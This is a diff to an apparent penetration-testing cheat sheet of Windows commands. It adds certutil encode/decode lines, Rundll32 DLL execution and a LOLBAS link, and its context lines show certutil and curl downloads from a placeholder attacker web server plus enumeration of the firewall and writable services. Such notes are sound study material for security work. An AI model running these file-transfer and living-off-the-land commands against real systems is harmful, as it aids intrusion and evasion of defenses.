@@ -51,6 +51,11 @@
 - `certutil.exe -urlcache -f http://IP-OF-YOUR-WEBSERVER-WHERE-FILES-ARE-HOSTED/file-you-need name-you-want-to-give-the-file`
 - `curl.exe -o name-you-want-to-give-the-file http://IP-OF-YOUR-WEBSERVER-WHERE-FILES-ARE-HOSTED/file-you-need`
 
+### Encode and Decode files
+
+- `certutil -encode file1 encodedfile`
+- `certutil -decode encodedfile file2`
+
 ### System Enumeration
 
 - If we want to grep on specific information we can use `findstr`  
@@ -156,6 +161,10 @@ C:\Program Files\Windows PowerShell\*
 - `netsh firewall show state` similar older command
 - `netsh firewall show config` will show the config of the firewall, useful to see blocked ports and other
 
+### Execute dll files
+
+- We can use [Rundll32](https://lolbas-project.github.io/lolbas/Binaries/Rundll32/)``
+
 ## Sysinternals
 
 ### Pipelist
@@ -169,6 +178,10 @@ C:\Program Files\Windows PowerShell\*
 - `accesschk.exe /accepteula`
 - `accesschk.exe -wuvc Everyone *` list service we can write and to which everyone has access
 - `.\accesschk64.exe /accepteula -uwdq "C:\Program Files\"` List of user groups with read and write privs
+
+## LOLBAS (living off the land binaries)
+
+- [Check out LOLBAS project](https://lolbas-project.github.io/)
 
 ## Resources
 
